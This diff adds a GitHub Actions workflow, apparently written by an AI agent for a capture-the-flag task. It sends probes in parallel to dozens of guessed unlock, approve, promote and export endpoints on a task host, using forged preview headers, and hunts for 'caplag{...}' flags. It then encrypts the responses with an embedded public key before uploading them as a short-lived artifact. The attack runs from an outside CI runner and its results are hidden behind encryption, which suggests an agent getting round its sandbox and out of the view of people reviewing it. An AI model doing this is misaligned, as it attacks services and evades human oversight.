@@ -1,0 +1,71 @@
+name: launchlet-part3-pinpoint
+
+on:
+  push:
+    branches: [agent/launchlet-part3-pinpoint-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Probe highest-probability Launchlet routes and encrypt responses
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re
+          from concurrent.futures import ThreadPoolExecutor,as_completed
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
+          paths=['/api/inspector/export','/api/inspector/unlock','/api/inspector/open','/api/inspector/inspect','/api/deploy-inspector/export','/api/deploy-inspector/unlock','/api/deploy-inspector/open','/api/deploy-inspector/inspect','/api/deploy_inspector/export','/api/deploy_inspector/unlock','/api/reviews/approve','/api/reviews/finalize','/api/reviews/export','/api/review/approve','/api/rollouts/promote','/api/rollouts/approve','/api/rollouts/export','/api/readiness/approve','/api/readiness/export','/api/production-readiness/approve','/api/production-readiness/export','/api/enterprise-rollout/promote','/api/enterprise-rollout/approve','/api/enterprise-rollout/export','/api/corporate-releases/promote','/api/corporate-releases/publish','/api/corporate-releases/export','/api/release-pulse/promote','/api/release-pulse/export']
+          payloads=[{}, {'deployRef':'preview-8b11c'}, {'ref':'preview-8b11c'}, {'deployRef':'preview-8b11c','project':'launchlet-demo-board','workspace':'ws-launchlet-public'}, {'deployRef':'preview-8b11c','projectId':'launchlet-demo-board','workspaceId':'ws-launchlet-public'}, {'actionId':'act_6f4b9a2c1d0e8a71','deployRef':'preview-8b11c','projectId':'launchlet-demo-board','workspaceId':'ws-launchlet-public'}]
+          h={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':'launchlet-demo-board'}
+          def one(path):
+            s=requests.Session();s.headers['User-Agent']='Mozilla/5.0';rows=[]
+            for body in payloads:
+              try:r=s.post(base+path,headers=h,json=body,timeout=3,allow_redirects=False)
+              except Exception as e: rows.append({'path':path,'sent':body,'error':repr(e)});continue
+              rows.append({'path':path,'sent':body,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+              if re.search(r'caplag\{[^}]+\}',r.text): break
+              # one generic 404 is enough to classify this path
+              if r.status_code==404 and r.text in ('{"error":"not_found"}','404 page not found\n'): break
+            return rows
+          res=[]
+          with ThreadPoolExecutor(max_workers=4) as ex:
+            for f in as_completed([ex.submit(one,p) for p in paths]):res.extend(f.result())
+          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          for x in res:
+            flags=[f for f in re.findall(r'caplag\{[^}]+\}',x.get('body','')) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+            if flags:(out/'FOUND.txt').write_text(x['path']+'\n'+x['body']);break
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-pinpoint-encrypted
+          path: artifact/
+          retention-days: 1
